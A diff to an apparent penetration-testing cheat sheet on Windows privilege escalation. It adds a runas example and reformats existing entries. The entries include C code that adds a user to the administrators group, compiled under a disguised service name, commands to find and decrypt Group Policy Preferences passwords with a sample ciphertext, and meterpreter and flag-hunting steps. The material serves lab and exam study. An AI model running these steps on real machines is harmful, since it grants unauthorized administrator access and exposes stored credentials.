@@ -1459,6 +1459,13 @@ Handy exploits:
 -   Powershell Priv Escalation Tools
     https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 
+
+-   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password:
+
+         C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "calc.exe"
+         Enter the password for Test:
+         Attempting to start calc.exe as user "COMPUTERNAME\Test" ...
+      
 -   Windows Service Configuration Viewer - Check for misconfigurations
     in services that can lead to privilege escalation. You can replace
     the executable with your own and have windows execute whatever code
@@ -1473,37 +1480,41 @@ Handy exploits:
          Everyone:(I)(F)
 
 -   Compile a custom add user command in windows using C  
-    root@kali:~\# cat useradd.c  
-    \#include <stdlib.h> /\* system, NULL, EXIT\_FAILURE \*/  
-    int main ()  
-    {  
-    int i;  
-    i=system ("net localgroup administrators low /add");  
-    return 0;  
-    }  
-      
-    i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+
+             root@kali:~\# cat useradd.c  
+             #include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
+             int main ()  
+             {  
+             int i;  
+             i=system ("net localgroup administrators low /add");  
+             return 0;  
+             }  
+
+             i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
 
 -   Group Policy Preferences (GPP)  
     A common useful misconfiguration found in modern domain environments
     is unprotected Windows GPP settings files
 
     -   map the Domain controller SYSVOL share  
-        net use z: \\\\dc01\\SYSVOL
+        
+        `net use z:\\dc01\SYSVOL`
 
     -   Find the GPP file: Groups.xml  
-        dir /s Groups.xml
+        
+        `dir /s Groups.xml`
 
     -   Review the contents for passwords  
-        type Groups.xml
+        
+        `type Groups.xml`
 
     -   Decrypt using GPP Decrypt  
-        gpp-decrypt
-        riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
+        
+        `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
         
 -   Find and display the proof.txt or flag.txt - get the loot!
-    `#meterpreter  >     run  post/windows/gather/win_privs`
     
+    `#meterpreter  >     run  post/windows/gather/win_privs`
     `cd\ & dir /b /s proof.txt`
     `type c:\pathto\proof.txt`
     
